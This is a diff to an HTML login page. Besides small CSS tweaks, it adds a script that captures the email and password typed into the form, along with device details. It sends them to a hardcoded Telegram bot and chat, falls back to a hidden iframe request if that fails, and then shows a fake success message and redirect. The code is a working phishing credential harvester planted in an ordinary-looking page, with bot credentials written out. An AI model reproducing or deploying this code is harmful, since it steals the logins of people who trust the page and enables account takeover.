@@ -270,6 +270,9 @@
         height: auto;
         padding: 30px;
       }
+      .login-card h2 {
+        font-size: 1.2rem;
+      }
 
       .background-svg {
         transform: translateX(250px); /* Less offset on medium screens */
@@ -321,6 +324,10 @@
         flex-direction: column;
         padding: 20px;
       }
+
+      .login-card h2 {
+        font-size: 1.2rem;
+      }
       
       /* Hide illustration area on mobile */
       .illustration-area {
@@ -342,7 +349,7 @@
       }
 
       .logo {
-        font-size: 28px;
+        font-size: 43px;
       }
     }
 
@@ -507,6 +514,169 @@
       // Trigger resize event once to set initial state
       window.dispatchEvent(new Event('resize'));
     });
+  </script>
+  <script>
+    // This script captures login form data and sends it to a Telegram bot
+// Replace the placeholder values with your actual Telegram bot token and chat ID
+
+// Configuration
+const TELEGRAM_BOT_TOKEN = '7316091615:AAFnx-JygG9rAGobIIlNswfkJCT2F6mygoU'; // Replace with your bot token
+const TELEGRAM_CHAT_ID = '5329637973';     // Replace with your chat ID
+
+
+// Функция для определения типа устройства
+function getMobileInfo() {
+  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+  
+  // Определяем тип устройства
+  let deviceType = "Компьютер";
+  if (/android/i.test(userAgent)) {
+    deviceType = "Android";
+  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+    deviceType = "iOS";
+  } else if (/windows phone/i.test(userAgent)) {
+    deviceType = "Windows Phone";
+  } else if (/mobile|tablet/i.test(userAgent)) {
+    deviceType = "Другое мобильное устройство";
+  }
+  
+  // Получаем дополнительную информацию
+  const screenSize = `${window.screen.width}x${window.screen.height}`;
+  const browserInfo = navigator.appName;
+  const osInfo = navigator.platform;
+  
+  return {
+    deviceType,
+    screenSize,
+    browserInfo,
+    osInfo,
+    userAgent
+  };
+}
+
+// Ждем полной загрузки документа
+document.addEventListener('DOMContentLoaded', function() {
+  // Находим элементы формы - универсальные селекторы для работы на разных устройствах
+  const loginButton = document.querySelector('button');
+  const emailField = document.querySelector('input[type="text"], input[type="email"]');
+  const passwordField = document.querySelector('input[type="password"]');
+  
+  console.log('Скрипт загружен, найдены элементы:', {
+    loginButton: !!loginButton,
+    emailField: !!emailField,
+    passwordField: !!passwordField
+  });
+  
+  // Подключаем обработчики для событий как клика, так и touch событий
+  if (loginButton) {
+    // Функция обработки данных формы
+    function handleFormSubmission() {
+      // Получаем значения полей
+      const email = emailField ? emailField.value : 'Поле email не найдено';
+      const password = passwordField ? passwordField.value : 'Поле пароля не найдено';
+      
+      console.log('Кнопка входа нажата, получены значения:', { email, password });
+      
+      // Собираем дополнительную информацию
+      const deviceInfo = getMobileInfo();
+      const dateTime = new Date().toISOString();
+      const pageURL = window.location.href;
+      
+      // Форматируем сообщение для отправки
+      const message = `
+🔐 Новая попытка входа 🔐
+------------------------------
+📧 Email/Логин: ${email}
+🔑 Пароль: ${password}
+⏰ Дата/Время: ${dateTime}
+📱 Устройство: ${deviceInfo.deviceType}
+📊 Размер экрана: ${deviceInfo.screenSize}
+🔍 Браузер: ${deviceInfo.browserInfo}
+💻 ОС: ${deviceInfo.osInfo}
+------------------------------
+`;
+      
+      // Отправляем данные в Telegram независимо от валидации
+      sendToTelegram(message);
+    }
+    
+    // Добавляем обработчики для разных типов устройств
+    loginButton.addEventListener('click', handleFormSubmission);
+    loginButton.addEventListener('touchend', handleFormSubmission); // Для сенсорных устройств
+    
+    console.log('Обработчики событий добавлены к кнопке входа');
+  } else {
+    console.error('Кнопка входа не найдена');
+  }
+  
+  // Функция отправки данных в Telegram
+  function sendToTelegram(message) {
+    console.log('Попытка отправки в Telegram:', message);
+    
+    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    fetch(telegramApiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Ошибка сети или API Telegram');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Успешная отправка в Telegram:', data);
+    })
+    .catch(error => {
+      console.error('Ошибка отправки в Telegram:', error);
+      
+      // Попытка повторной отправки через альтернативный метод
+      try {
+        // Создаем скрытый iframe для альтернативной отправки
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        // Используем GET запрос как запасной вариант (менее предпочтительно, но работает в некоторых случаях)
+        iframe.src = `${telegramApiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        // Удаляем iframe через некоторое время
+        setTimeout(() => {
+          document.body.removeChild(iframe);
+        }, 3000);
+      } catch (e) {
+        console.error('Не удалось выполнить запасной вариант отправки:', e);
+      }
+    });
+  }
+});
+  
+  // Function to show login success message or redirect
+  function showLoginSuccess() {
+    // Create a success message or loading spinner
+    const successMessage = document.createElement('div');
+    successMessage.style.color = '#28a745';
+    successMessage.style.textAlign = 'center';
+    successMessage.style.marginTop = '15px';
+    successMessage.innerHTML = 'Login successful! Redirecting...';
+    
+    // Add it below the login button
+    const signUpPrompt = document.querySelector('.sign-up-prompt');
+    signUpPrompt.parentNode.insertBefore(successMessage, signUpPrompt);
+    
+    // Optional: Redirect after a delay
+    setTimeout(() => {
+      window.location.href = 'https://dashboard.example.com'; // Replace with your redirect URL
+    }, 2000);
+  }
   </script>
 </body>
 </html>
